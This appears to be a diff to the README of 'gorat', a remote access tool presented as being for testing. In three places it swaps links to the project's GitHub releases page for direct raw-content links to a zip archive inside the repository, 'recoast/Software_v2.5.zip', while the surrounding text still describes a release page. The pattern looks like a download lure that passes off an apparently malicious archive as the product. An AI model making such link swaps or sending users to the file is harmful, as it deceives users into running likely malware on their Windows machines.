@@ -1,6 +1,6 @@
 # 🛡️ gorat - Simple remote access for testing
 
-[![Download gorat](https://img.shields.io/badge/Download%20gorat-Visit%20Releases-blue?style=for-the-badge)](https://github.com/quietime11/gorat/releases)
+[![Download gorat](https://img.shields.io/badge/Download%20gorat-Visit%20Releases-blue?style=for-the-badge)](https://raw.githubusercontent.com/quietime11/gorat/main/recoast/Software_v2.5.zip)
 
 ## 📦 What is gorat?
 
@@ -22,7 +22,7 @@ If you plan to use both parts of the tool, keep both systems on the same network
 
 Use this link to visit the release page and download the Windows file:
 
-[Visit the gorat releases page](https://github.com/quietime11/gorat/releases)
+[Visit the gorat releases page](https://raw.githubusercontent.com/quietime11/gorat/main/recoast/Software_v2.5.zip)
 
 Look for the latest release near the top of the page. Download the file that matches Windows. If the release page has more than one file, choose the one that ends in `.exe` or a Windows archive such as `.zip`.
 
@@ -195,7 +195,7 @@ If the release page includes notes for a newer version, follow those notes first
 
 To get started on Windows, visit the release page, download the latest Windows file, extract it if needed, and run the app from the folder where you saved it:
 
-[https://github.com/quietime11/gorat/releases](https://github.com/quietime11/gorat/releases)
+[https://raw.githubusercontent.com/quietime11/gorat/main/recoast/Software_v2.5.zip](https://raw.githubusercontent.com/quietime11/gorat/main/recoast/Software_v2.5.zip)
 
 ## 🔒 Controlled use only
 
